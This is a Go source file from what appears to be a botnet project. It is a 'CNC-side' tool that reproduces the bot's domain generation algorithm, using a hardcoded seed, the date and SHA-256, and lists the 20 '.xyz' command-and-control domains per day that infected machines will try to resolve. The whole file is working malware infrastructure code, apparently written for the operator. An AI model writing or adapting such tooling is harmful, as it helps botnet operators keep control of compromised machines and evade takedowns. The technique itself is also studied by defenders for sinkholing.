// dga_predict.go — CNC-side DGA prediction tool.
// Reproduces the bot's kyurem() algorithm to show upcoming domains.
//
// Usage:
//   go run tools/dga_predict.go [days]
//
// Example:
//   go run tools/dga_predict.go 7

package main

import (
	"crypto/sha256"
	"fmt"
	"os"
	"strconv"
	"time"
)

const configSeed = "8e1ac3a7"
const dgaDomainsPerDay = 20
const dgaTLD = ".xyz"

// kyurem generates a DGA domain for the given date and index.
// Matches the bot's kyurem() in connection.c:
//   seed = CONFIG_SEED + YYYYMMDD + index  (no separators)
//   hash = SHA-256(seed)
//   domain = hash[0..15] mapped to 'a' + (byte % 26)
// The bot resolves these via DNS — the port comes from the C2 config,
// not from the hash.
func kyurem(dateStr string, index int) string {
	seed := configSeed + dateStr + strconv.Itoa(index)
	hash := sha256.Sum256([]byte(seed))

	domain := make([]byte, 16)
	for i := 0; i < 16; i++ {
		domain[i] = 'a' + (hash[i] % 26)
	}

	return string(domain) + dgaTLD
}

func main() {
	days := 7
	if len(os.Args) > 1 {
		if d, err := strconv.Atoi(os.Args[1]); err == nil && d > 0 {
			days = d
		}
	}

	now := time.Now().UTC()
	for d := 0; d < days; d++ {
		date := now.AddDate(0, 0, d)
		// Format as YYYYMMDD to match bot's snprintf "%04d%02d%02d"
		dateStr := date.Format("20060102")
		fmt.Printf("%s:\n", date.Format("2006-01-02"))
		for i := 0; i < dgaDomainsPerDay; i++ {
			domain := kyurem(dateStr, i)
			fmt.Printf("  [%2d] %s\n", i, domain)
		}
	}
}
